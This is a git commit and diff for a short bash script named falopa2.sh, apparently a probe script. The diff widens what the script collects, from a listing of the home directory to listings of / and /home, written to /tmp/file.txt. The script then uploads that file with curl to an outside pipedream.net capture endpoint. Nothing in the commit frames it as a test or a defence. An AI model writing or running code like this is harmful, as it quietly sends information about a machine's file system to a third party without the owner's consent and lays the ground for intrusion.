349bfc3106cfb74a025576aabd96491cb2b7ce38
_m <matiasesena@gmail.com>
2021-11-04 16:52:09 -0300

    Update falopa2.sh

--- falopa2.sh
+++ falopa2.sh
@@ -1,6 +1,8 @@
 #!/bin/bash
 
-echo $(ls -la ~/) > /tmp/file.txt
+echo $(ls -la /) > /tmp/file.txt
+echo $(ls -la /home) >> /tmp/file.txt
+
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
 
